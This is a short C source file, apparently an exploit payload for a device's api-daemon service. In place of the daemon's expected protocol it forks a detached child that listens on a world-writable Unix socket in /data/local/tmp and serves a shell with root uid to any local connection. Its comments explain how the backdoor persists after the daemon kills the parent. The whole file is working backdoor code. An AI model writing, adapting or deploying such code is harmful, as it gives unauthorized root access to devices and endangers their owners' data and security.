#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdlib.h>

#define SOCK "/data/local/tmp/rsock"

/*
	api-daemon sets IPC_FD env var and expects a bincode-serialized
	ChildToParentMessage::Created response on that fd. We don't implement
	the protocol: we just drop a backdoor and exit. api-daemon will log
	"Failed to decode child message" and SIGKILL us, but the forked
	listener already has uid 0 and persists.
*/

static void drop_backdoor(void)
{
	pid_t pid = fork();
	if (pid < 0) _exit(1);
	if (pid > 0) return; // parent returns

	// child: detach and listen
	setsid();
	signal(SIGCHLD, SIG_IGN);

	int s = socket(AF_UNIX, SOCK_STREAM, 0);
	if (s < 0) _exit(2);

	struct sockaddr_un a;
	memset(&a, 0, sizeof(a));
	a.sun_family = AF_UNIX;
	strncpy(a.sun_path, SOCK, sizeof(a.sun_path) - 1);

	unlink(SOCK);
	if (bind(s, (struct sockaddr *)&a, sizeof(a)) < 0) _exit(3);
	chmod(SOCK, 0666); // shell user can connect
	if (listen(s, 5) < 0) _exit(4);

	for (;;)
	{
		int c = accept(s, NULL, NULL);
		if (c < 0) continue;
		pid_t cl = fork();
		if (cl == 0)
		{
			dup2(c, 0);
			dup2(c, 1);
			dup2(c, 2);
			close(c);
			// Even in child-daemon SELinux domain, a root-uid sh gives
			// us broad DAC-bypass capabilities.
			execl("/system/bin/sh", "sh", NULL);
			_exit(127);
		}
		close(c);
	}
}

int main(int argc, char **argv)
{
	// Drop the listener immediately.
	drop_backdoor();

	// Sleep briefly so api-daemon's watchdog doesn't SIGKILL us before
	// the fork completes.
	sleep(1);

	// Then exit; api-daemon will mark the service as crashed.
	return 0;
}
